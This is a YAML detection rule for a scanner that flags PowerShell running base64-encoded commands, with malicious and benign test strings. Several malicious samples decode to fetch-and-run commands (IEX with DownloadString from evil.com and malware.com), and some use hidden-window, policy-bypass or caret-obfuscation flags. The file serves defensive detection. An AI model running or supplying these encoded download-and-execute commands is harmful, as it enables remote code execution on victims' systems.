name: critical-01-base64-powershell
severity: critical
description: >
  Detects PowerShell executing base64-encoded commands. Strong indicator of ClickFix attacks hiding malicious payloads.

pattern: |
  (?i)powershell.*-\s*(?:e|enc|encodedcommand)(?:\^?[a-z])*?\s+[A-Za-z0-9+/]{20,}={0,2}

malicious:
  - "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcAAuAHAAcwAxACIAKQA="
  - "powershell.exe -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEUA"
  - "powershell -e SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=="
  - "POWERSHELL -ENC SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
  - "PowerShell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAGwAbABvACIA"
  - "powershell -encoded cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgAA=="
  - "powershell -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIA"
  - "powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA=="
  - "powershell -encodedcommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvAG0AYQBsAHcAYQByAGUALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAiACkA"
  - "powershell.exe -nop -ep bypass -enc cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwAgAGMAYQBsAGMA"
  - "cmd /c powershell -e VwByAGkAdABlAC0ASABvAHMAdAAgACIATQBhAGwAaQBjAGkAbwB1AHMAIQ=="
  - "powershell -ep bypass -w hidden -encodedcommand ZQB4AGUAYwAoACIAbQBhAGwAaQBjAGkAbwB1AHMAIABJAG4AZgBvAHIAbQBhAHQAaQBvAG4AIgApAA=="
  - "powershell -E^N^C SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
  - "powershell.exe -e^n^c^o^d^e^d^c^o^m^m^a^n^d JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA="
  - "cmd /c powershell -e^nc VwByAGkAdABlAC0ASABvAHMAdAAgACIATQBhAGwAaQBjAGkAbwB1AHMAIQ=="

benign:
  - 'powershell -Command "Get-Process"'
  - "powershell -enc QwA="
  - "powershell -e dGU="
  - "powershell -ExecutionPolicy Bypass script.ps1"
  - "powershell.exe Get-Service"
  - "powershell -File C:\\Scripts\\backup.ps1"
  - 'powershell -Command "Write-Host ''Hello World''"'
  - 'powershell -NoProfile -Command "Get-Date"'
  - 'powershell.exe -Version 5.1 -Command "ls"'
  - 'powershell -c "Get-ChildItem"'
  - "powershell Get-Process | Select-Object Name"
